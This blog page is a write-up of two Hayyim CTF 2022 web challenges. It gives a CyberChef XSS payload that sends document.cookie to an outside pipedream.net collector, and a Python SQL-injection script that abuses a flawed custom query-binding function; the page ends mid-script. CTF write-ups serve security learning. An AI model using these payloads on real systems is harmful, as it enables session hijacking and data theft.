<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" data-mode="dark">
  <!-- The Head -->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  >

  

  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="Hayyim CTF 2022 Write Up" />
<meta property="og:locale" content="en" />
<meta name="description" content="This article is about write-up for the Hayyim CTF 2022. there is only four web challenges, all of which contain XSS and SQL Injection and Logic Bug on Gnuboard bug" />
<meta property="og:description" content="This article is about write-up for the Hayyim CTF 2022. there is only four web challenges, all of which contain XSS and SQL Injection and Logic Bug on Gnuboard bug" />
<link rel="canonical" href="http://localhost:4000/posts/Hayyim-CTF/" />
<meta property="og:url" content="http://localhost:4000/posts/Hayyim-CTF/" />
<meta property="og:site_name" content="Web2.0" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-02-14T08:29:53+09:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Hayyim CTF 2022 Write Up" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-02-14T08:29:53+09:00","datePublished":"2022-02-14T08:29:53+09:00","description":"This article is about write-up for the Hayyim CTF 2022. there is only four web challenges, all of which contain XSS and SQL Injection and Logic Bug on Gnuboard bug","headline":"Hayyim CTF 2022 Write Up","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/Hayyim-CTF/"},"url":"http://localhost:4000/posts/Hayyim-CTF/"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>Hayyim CTF 2022 Write Up | Web2.0
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<meta name="apple-mobile-web-app-title" content="Web2.0">
<meta name="application-name" content="Web2.0">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">
  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.2/css/all.min.css">


  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.21.3/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  
  <style>
  hr {
    background:white;
    height:1px;
    border:0;
}
.core-app-profile--audithistory--auditwrapper {
	border: 1px solid #beb3c5;
    border: 1px solid var(--color__border-l1);
    border-radius: 4px;
    background-color: var(--color__bg-l1);
    display: flex;
    flex-direction: column;
    padding: 1rem;
    cursor: pointer
}

:root,:root.dark {
    --color__label-red: #ed2360;
    --color__label-yellow: #ffd330;
    --color__label-green: #17a05a;
    --color__label-blue: #2d20e2;
    --color__label-purple: #7549ff;
    --color__label-cyan: #18b4f8;
    --color__text-primary: #e6e6e6;
    --color__text-secondary: #adabb2;
    --color__text-tertiary: #8d8a99;
    --color__text-disabled: #6b6680;
    --color__text-yellow: #ffe878;
    --color__text-destructive: #ff6a8c;
    --color__text-primary-inv: #3f3c4f;
    --color__bg-l0: #1a1825;
    --color__bg-l1: #22202d;
    --color__bg-l2: #2e2b3b;
    --color__bg-l3: #3a3649;
    --color__bg-sidebar: #22202d;
    --color__bg-main: #1a1825;
    --color__bg-hover-l0: #1e1c2b;
    --color__bg-hover-l1: #272432;
    --color__bg-hover-l2: #332f41;
    --color__bg-l0-inv: #fff;
    --color__border-l0: #322f3f;
    --color__border-l1: #322f3f;
    --color__border-l2: #403c4d;
    --color__border-l3: #4f4c5f;
    --color__border-tertiary: rgba(208,204,255,.059);
    --color__overlay: #110f19;
    --font-size__header-xl: 1.625rem;
    --font-size__header-lg: 1.5rem;
    --font-size__header-md: 1.375rem;
    --font-size__header-sm: 1.25rem;
    --font-size__core-copy: 1.125rem;
    --font-size__lg: 1.063rem;
    --font-size__md: 0.938rem;
    --font-size__sm: 0.813rem;
    --color__alert-warning-text: #ebfcff;
    --color__alert-warning-text-secondary: #a1e6ff;
    --color__alert-warning-bg: #052947;
    --color__alert-warning-border: #085f96;
    --color__alert-error-text: #fff0f2;
    --color__alert-error-text-secondary: #ffcbd5;
    --color__alert-error-bg: #650126;
    --color__alert-error-border: #c70948
}
@media(prefers-reduced-motion:no-preference) {
    a {
        transition: color .2s ease-in-out
    }
}
.core-app-profile__bodybottom {
	width:100%;
	order:3;
	display:flex;
	flex-direction:column;
	gap:2rem
}

.profile--audithistory--loadmore {
	text-align:center
}
.profile--audithistory--loadmore hr {
	height:2px;
	background:#7549ff
}
.profile--audithistory--loadmore button {
	color:#fff;
	font-size:16px;
	width:max-content;
	margin:5px auto;
	display:flex;
	flex-direction:row;
	gap:5px;
	justify-content:center;
	align-items:center;
	cursor:pointer
}
.profile--audithistory--loadmore button svg {
	width:16px;
	height:16px
}
.profile--audithistory--loadmore button svg path {
	fill:#7549ff
}
.profile--audithistory--loadmore .audithistory--unavailable {
	margin-top:1rem;
	border:2px solid #2e2b3b;
	border-radius:.25rem;
	padding:1rem
}
.profile--audithistory--loadmore .audithistory--unavailable p {
	font-size:.875rem;
	line-height:1.125rem;
	text-align:start
}
.profile--audithistory--loadmore .audithistory--unavailable p strong {
	color:#fff
}
.profile--audithistory--auditsponsorimg {
	min-width:50px;
	min-height:50px;
	max-width:50px;
	max-height:50px;
	border-radius:50%
}
.profile--audithistory--auditheading {
	position:relative;
	display:flex;
	flex-direction:row;
	gap:14px;
	left:-15px;
	align-items:flex-end
}
.profile--audithistory--auditheading--date {
	font-size:14px;
	line-height:18px
}
.profile--audithistory--auditheading--title {
	font-size:20px;
	line-height:24px;
	color:#fff
}
.profile--audithistory--monthwrapper {
	margin-top:30px
}
.profile--audithistory--auditwrapper {
	position:relative;
	height:auto;
	margin:10px 0 30px 15px
}
.profile--audithistory--heading {
	display:flex;
	flex-direction:row;
	gap:10px;
	align-items:center;
	margin-bottom:25px
}
.profile--audithistory--heading p {
	font-size:18px;
	color:#fff;
	white-space:nowrap
}
.profile--audithistory--heading hr {
	border:1px solid #2e2b3b;
	width:100%;
	height:1px
}
.profile--auditseverity {
	position:relative
}
.profile--auditseverity--lineconnector {
	position:relative;
	left:9px;
	min-height:15px;
	width:.5px;
	background-color:#2e2b3b
}
.profile--auditseverity--lineconnector:last-of-type {
	position:absolute;
	bottom:0
}
.profile--auditseverity--ring {
	width:25px;
	height:25px;
	border-radius:50%;
	display:flex;
	align-items:center;
	justify-content:center;
	position:relative;
	left:-3px
}
.profile--auditseverity--ring--inner {
	border-radius:50%;
	width:5px;
	height:5px;
	background:#fff
}
.profile--auditseverity--severity {
	position:relative;
	display:flex;
	margin-left:45px;
	top:-24px
}
.profile--auditseverity--severity--heading {
	color:var(--color__text-primary)
}
.profile--auditseverity--severity--content {
	margin-left:8px
}
.profile--auditseverity--severity--content--flexwrapper {
	display:flex;
	column-gap:8px;
	row-gap:5px;
	align-items:center;
	flex-wrap:wrap;
	margin-bottom:5px
}
.profile--auditseverity--severity--decorator {
	min-width:4px;
	max-width:4px;
	height:auto
}
.profile--auditseverity--severity--locked {
	font-size:12px;
	display:flex;
	gap:5px;
	flex-direction:row;
	justify-content:flex-start;
	align-items:center
}
.profile--auditseverity--severity--title {
	color:#fff;
	font-weight:semibold;
	overflow-wrap:anywhere
}
.core-app-profile--audithistory--monthwrapper {
	margin-top:40px;
	display:flex;
	flex-direction:column;
	gap:1rem
}
.core-app-profile--audithistory--monthwrapper:first-child {
	margin-top:0
}
.core-app-profile--audithistory--heading {
	display:flex;
	flex-direction:row;
	gap:10px;
	align-items:center;
	justify-content:space-between;
	font-size:var(--font-size__header-md);
	color:var(--color__text-primary)
}
.core-app-profile--audithistory--auditwrapper {
	border: 1px solid #beb3c5;
	border-radius:4px;
	background-color:var(--color__bg-l1);
	display:flex;
	flex-direction:column;
	padding:1rem;
	cursor:pointer
}
.core-app-profile--audithistory--heading {
	display:flex;
	flex-direction:row;
	gap:10px;
	align-items:center;
	justify-content:space-between;
	font-size:var(--font-size__header-md);
	color:var(--color__text-primary)
}
.core-app-profile--audithistory--auditheading {
	position:relative;
	display:flex;
	flex-direction:row;
	gap:14px;
	align-items:center;
	justify-content:space-between
}
.core-app-profile--audithistory--content-wrapper {
	
	flex:1 1;
	position:relative;
	display:flex;
	flex-direction:column;
	gap:14px
}
@media(min-width:450px) {
	.core-app-profile--audithistory--content-wrapper {
		flex-direction:row;
		align-items:center;
		justify-content:space-between
	}
}
.core-app-profile--audithistory--header-wrapper {
	display:flex;
	flex-direction:row;
	gap:14px;
	align-items:center
}
.core-app-profile--audithistory--title {
	font-size:20px;
	line-height:24px;
	font-weight:700;
	color:var(--color__text-primary)
}
.core-app-profile--audithistory--date {
  text-overflow:ellipsis
	white-space:nowrap
}
.core-app-profile--audithistory--wrapper {
	display:flex;
	flex-direction:column-reverse;
	height:100%
}
  </style>

  <!-- A placeholder to allow defining custom metadata -->

  <script src="https://code4rena.com/_next/static/chunks/app/%5B@username%5D/page-20c23029062acd7f.js"></script>
</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle">
      
        
        <img src="/assets/img/ant.jpg" width="112" height="112" alt="avatar" onerror="this.style.display='none'">
      
    </a>

    <h1 class="site-title">
      <a href="/">Web2.0</a>
    </h1>
    <p class="site-subtitle fst-italic mb-0">Amennnn</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <li class="nav-item">
          <a href="https://evm.pics" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i><span>ABOUT</span>
          </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    

    
      

      
        <a
          href="https://x.com/l0ptus"
          aria-label="x"
          

          

          

          
        >
          <i class="fab fa-twitter"></i>
        </a>
      
    
      

      
        <a
          href="https://blockscan.com/address/0xc39777E85d97a0B5655C62C6378F00D494feAce1"
          aria-label="wallet"
          

          

          

          
        >
          <i class="fab fa-ethereum"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    style="background-color:#030014"
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">
                Home
              </a>
            </span>

          
        
          
        
          
            
              <span>Hayyim CTF 2022 Write Up</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->





<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  

  
  

  

  
  

  

  
  

  




<!-- return -->




<article class="px-1">
  <header>
    <h1 data-toc-skip>Hayyim CTF 2022 Write Up</h1>

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1644794993"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Feb 14, 2022
</time>

      </span>

      <!-- lastmod date -->
      

      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              <a href="https://x.com/l0ptus">anonymous</a>
            
          </em>
        </span>

        <!-- read time -->
        <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="2641 words"
>
  <em>14 min</em> read</span>

      </div>
      <!-- .d-flex -->
    </div>
    <!-- .post-meta -->
  </header>

  <div class="content">
    <h1 id="summary">Summary</h1>

<p>This weekend, Hayyim Security hosted the CTF, and I participated in it for about 3 ~ 4 hours and I was solved Cyberchef, Not E and Cyber Headchef challenges.</p>

<hr />
<h1 id="web-cyberchef-100-pts">(Web) Cyberchef [100 pts]</h1>

<p>The Cyberchef is a simple XSS challenge. Cyberchef service is open source that provides encryption/decryption service and has 1-Day vulnerability.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>http://cyberchef:8000/#recipe=Scatter_chart('Line%20feed','Space',false,'','','red"&gt;&lt;script&gt;fetch("https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/".concat(document.cookie))&lt;/script&gt;',100,false)&amp;input=MTAwLCAxMDA
</pre></td></tr></tbody></table></code></div></div>
<p>1-Day issues can be found <a href="https://github.com/gchq/CyberChef/issues/1265">here</a>. And I was able to get the flag by sending the above PoC to the admin bot.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>FLAG : hsctf{fa98fe3d32b4302aff1c322c925238a9d935b636f265cbfdd798391ca9c5a905}
</pre></td></tr></tbody></table></code></div></div>

<hr />
<h1 id="web-not-e-158-pts">(Web) Not E [158 pts]</h1>

<p>The Not E challenge is a SQL Injection issue. In this problem, we are using our own binding function, not the Prepared Binding function provided by sqlite of Node, and this function has a vulnerability.</p>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">sqlite3</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">sqlite3</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">flag</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">fs</span><span class="dl">'</span><span class="p">).</span><span class="nf">readFileSync</span><span class="p">(</span><span class="dl">'</span><span class="s1">/flag</span><span class="dl">'</span><span class="p">).</span><span class="nf">toString</span><span class="p">();</span>

<span class="kd">class</span> <span class="nc">Database</span> <span class="p">{</span>
  <span class="nf">constructor</span><span class="p">(</span><span class="nx">filename</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">this</span><span class="p">.</span><span class="nx">db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">sqlite3</span><span class="p">.</span><span class="nc">Database</span><span class="p">(</span><span class="nx">filename</span><span class="p">);</span>

    <span class="k">this</span><span class="p">.</span><span class="nx">db</span><span class="p">.</span><span class="nf">serialize</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
      <span class="k">this</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="dl">'</span><span class="s1">create table members (username text, password text)</span><span class="dl">'</span><span class="p">);</span>
      <span class="k">this</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="dl">'</span><span class="s1">create table posts (id text, title text, content text, owner text)</span><span class="dl">'</span><span class="p">);</span>
      <span class="k">this</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="dl">'</span><span class="s1">create table flag (flag text)</span><span class="dl">'</span><span class="p">);</span>
      <span class="k">this</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="dl">'</span><span class="s1">insert into flag values (?)</span><span class="dl">'</span><span class="p">,</span> <span class="p">[</span> <span class="nx">flag</span> <span class="p">]);</span>
    <span class="p">});</span>
  <span class="p">}</span>
<span class="c1">// (skip..)</span>
</pre></td></tr></tbody></table></code></div></div>
<p>I could see the FLAG were stored in a table called <code class="language-plaintext highlighter-rouge">flag</code>. So, in order to solve this challenge, we have to use SQL Injection to leak the flags contained in the table. Otherwise, read the /flag file using RCE, but this is not possible. Therefore, we should focus on SQL Injection.</p>

<ul>
  <li>/login</li>
  <li>/logout</li>
  <li>/new</li>
  <li>/view/:noteId</li>
</ul>

<p>First, the functions provided by the Note service are login, post writing, and post reading functions.</p>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">checkParam</span> <span class="o">=</span> <span class="p">(</span><span class="nx">param</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="k">if </span><span class="p">(</span><span class="k">typeof</span> <span class="nx">param</span> <span class="o">!==</span> <span class="dl">'</span><span class="s1">string</span><span class="dl">'</span> <span class="o">||</span> <span class="nx">param</span><span class="p">.</span><span class="nx">length</span> <span class="o">===</span> <span class="mi">0</span> <span class="o">||</span> <span class="nx">param</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">256</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
<span class="p">};</span>
</pre></td></tr></tbody></table></code></div></div>
<p>And all input values are type checked by checkParam function.</p>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>  <span class="err">#</span><span class="nf">formatQuery</span><span class="p">(</span><span class="nx">sql</span><span class="p">,</span> <span class="nx">params</span> <span class="o">=</span> <span class="p">[])</span> <span class="p">{</span>
    <span class="k">for </span><span class="p">(</span><span class="kd">const</span> <span class="nx">param</span> <span class="k">of</span> <span class="nx">params</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if </span><span class="p">(</span><span class="k">typeof</span> <span class="nx">param</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">number</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">sql</span> <span class="o">=</span> <span class="nx">sql</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="dl">'</span><span class="s1">?</span><span class="dl">'</span><span class="p">,</span> <span class="nx">param</span><span class="p">);</span>
      <span class="p">}</span> <span class="k">else</span> <span class="k">if </span><span class="p">(</span><span class="k">typeof</span> <span class="nx">param</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">string</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">sql</span> <span class="o">=</span> <span class="nx">sql</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="dl">'</span><span class="s1">?</span><span class="dl">'</span><span class="p">,</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">(</span><span class="nx">param</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sr">/</span><span class="se">[</span><span class="sr">"</span><span class="se">\\]</span><span class="sr">/g</span><span class="p">,</span> <span class="dl">''</span><span class="p">)));</span>
      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nx">sql</span> <span class="o">=</span> <span class="nx">sql</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="dl">'</span><span class="s1">?</span><span class="dl">'</span><span class="p">,</span> <span class="dl">""</span><span class="p">);</span> <span class="c1">// unreachable</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nx">sql</span><span class="p">;</span>
  <span class="p">};</span>
</pre></td></tr></tbody></table></code></div></div>
<p>In addition, all sql queries are using custom binding function. I thought there was a weakness here. The reason is that the server uses the custom binding function even though the node’s sqlite provides the binding function.</p>

<p>In the formatQuery() function, after using the JSON.stringify() method to convert the input value into a string, you can see that the generated value and ‘?’ are replaced.</p>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">(</span><span class="dl">'</span><span class="s1">Hello Pocas</span><span class="dl">'</span><span class="p">)</span>
<span class="dl">'</span><span class="s1">"Hello Pocas"</span><span class="dl">'</span>
<span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">(</span><span class="dl">"</span><span class="s2">Hello Pocas</span><span class="dl">"</span><span class="p">)</span>
<span class="dl">'</span><span class="s1">"Hello Pocas"</span><span class="dl">'</span>
</pre></td></tr></tbody></table></code></div></div>
<p>When JSON.stringify() is used, double quotation marks(“) are added to both ends of the string as shown above.</p>

<div class="language-sql highlighter-rouge"><div class="code-header">
        <span data-label-text="Sql"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="k">insert</span> <span class="k">into</span> <span class="n">posts</span> <span class="k">values</span> <span class="p">(</span><span class="s1">'noteid'</span><span class="p">,</span> <span class="nv">""</span><span class="o">?</span><span class="nv">""</span><span class="p">,</span> <span class="o">?</span><span class="p">,</span> <span class="o">?</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>
<p>If you use the writing function and pass a question mark character as the value of title, the query is created as above. And when you check the value of the second argument of the query, you can see that a question mark is created after the string (“”), and the value of content is replaced with the question mark randomly generated. so you can escape the double quarter by this.</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">uuid</span>
<span class="kn">import</span> <span class="n">re</span>

<span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://1.230.253.91:1000</span><span class="sh">"</span>
<span class="n">username</span> <span class="o">=</span> <span class="n">uuid</span><span class="p">.</span><span class="nf">uuid4</span><span class="p">()</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Exploit</span><span class="sh">"</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] Username  : </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
<span class="n">sess</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nc">Session</span><span class="p">()</span>
<span class="c1"># Login/Register
</span><span class="n">account</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">:</span><span class="n">username</span><span class="p">,</span> <span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">pocas</span><span class="sh">"</span><span class="p">}</span>
<span class="n">res</span> <span class="o">=</span> <span class="n">sess</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">'</span><span class="s">/login</span><span class="sh">'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">account</span><span class="p">)</span>

<span class="c1"># Leak the flag
</span><span class="n">poc</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">title</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">?</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">content</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">,(select flag from flag),?)--</span><span class="sh">"</span><span class="p">}</span>
<span class="n">res</span> <span class="o">=</span> <span class="n">sess</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">'</span><span class="s">/new</span><span class="sh">'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">poc</span><span class="p">)</span>

<span class="c1"># Parse the flag path
</span><span class="n">flag_path</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sh">'</span><span class="s">\/view\/[0-9a-z]*</span><span class="sh">'</span><span class="p">,</span> <span class="n">sess</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">).</span><span class="n">text</span><span class="p">).</span><span class="nf">group</span><span class="p">()</span>
<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] Flag Path : </span><span class="si">{</span><span class="n">flag_path</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

<span class="c1"># Read the flag
</span><span class="n">flag</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sh">'</span><span class="s">hsctf\{[0-9a-z]*\}</span><span class="sh">'</span><span class="p">,</span> <span class="n">sess</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">flag_path</span><span class="p">).</span><span class="n">text</span><span class="p">).</span><span class="nf">group</span><span class="p">()</span>
